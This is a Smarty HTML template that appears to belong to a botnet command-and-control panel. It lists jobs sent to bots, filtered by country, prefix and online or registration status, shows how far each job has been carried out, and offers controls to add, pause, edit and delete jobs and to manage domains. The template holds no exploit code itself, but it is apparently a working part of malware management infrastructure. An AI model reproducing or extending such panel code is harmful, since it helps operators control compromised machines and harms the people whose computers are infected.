<div class="top_menu">
<div class="top_menu_left">
{if $_SESSION.user->access.bots.jobs_add eq on}<a href="#" onclick="get_window('/bots/jobs_add.html?window=1', {ldelim}name:'jobs_add', widht: 800{rdelim});">{$lang.dobzada}</a>&nbsp;{/if}
{if $_SESSION.user->access.bots.jobs_add eq on}<a href="/bots/links.html">{$lang.links}</a>&nbsp;{/if}
{if $_SESSION.user->access.bots.domains eq on}<a href="/bots/domains.html">{$lang.domains}</a>&nbsp;{/if}
{if $_SESSION.user->access.bots.pgt eq on}<a href="#" onclick="get_window('/bots/pgt.html?window=1', {ldelim}name:'pgt', widht: 800{rdelim});">{$lang.pgt}</a>&nbsp;{/if}
</div>

<div class="top_menu_right">
<a href="#" onclick="delete_cmd('all');">{$lang.edvszad}</a>&nbsp;
</div>

</div>
<hr />

<table cellspacing="1" cellpadding="5" style="width: 100%; border: 1px solid #cccccc; font-size:10px; text-align:center">
<tr class="bgp3">
	<td style="width: 10%;">{$lang.type}</td>
	<td style="width: 10%;">{$lang.country}</td>
    <td style="width: 10%;">{$lang.pref}</td>
    <td style="width: 6%;">{$lang.status}</td>
    <td style="width: 44%;">{$lang.cmd}</td>
    <td style="width: 14%;">{$lang.fulfilled}</td>
	<td style="width: 2%;"></td>
	<td style="width: 2%;"></td>
	<td style="width: 2%;"></td>
</tr>
{foreach from=$cmds item=cmd name=cmds}
{if $smarty.foreach.cmds.iteration is not even}{assign var=bg value=2}{else}{assign var=bg value=1}{/if}
<tr class="bgp{$bg}" id="cmd{$cmd->id}" {if $cmd->enable eq 0} style="background-image: url(/images/body-bg.gif)"{/if}>
	<td>{$cmd->str}</td>
	<td>
    {if $cmd->country eq '*'}{$lang.all}{else}{$cmd->country}{/if}
    </td>
    <td>{if $cmd->prefix eq '*'}{$lang.all}{else}{$cmd->prefix|replace:'|':'<br />'}{/if}</td>
    <td>{if $cmd->online eq 1}{$lang.all}{elseif $cmd->online eq 3}{$lang.novim}{elseif $cmd->online eq 2}{$lang.zareg}{/if}</td>
    <td>{$cmd->cmd}</td>
    {if $cmd->max > 0}
    <td title="{$cmd->count} из {$cmd->max}">{number_format($cmd->count / $cmd->max * 100, 2)}%</td>
    {else}
    <td>{$cmd->count}</td>
    {/if}
	<td><a href="#" onclick="update_cmd('{$cmd->id}');">{if $cmd->enable eq 1}<img src="/images/pause.png" alt="{$lang.vikluc}" />{else}<img src="/images/play.png" alt="{$lang.vkluc}" />{/if}</a></td>
	<td><a href="#" onclick="get_window('/bots/jobs_edit-{$cmd->id}.html?window=1', {ldelim}name:'jobs_edit{$cmd->id}', widht: 800{rdelim});"><img src="/images/edit.png" alt="{$lang.edit}" /></a></td>
	<td><a href="#" onclick="delete_cmd('{$cmd->id}');"><img src="/images/delete.png" alt="{$lang.delet}" /></a></td>
</tr>
{/foreach}
</table>
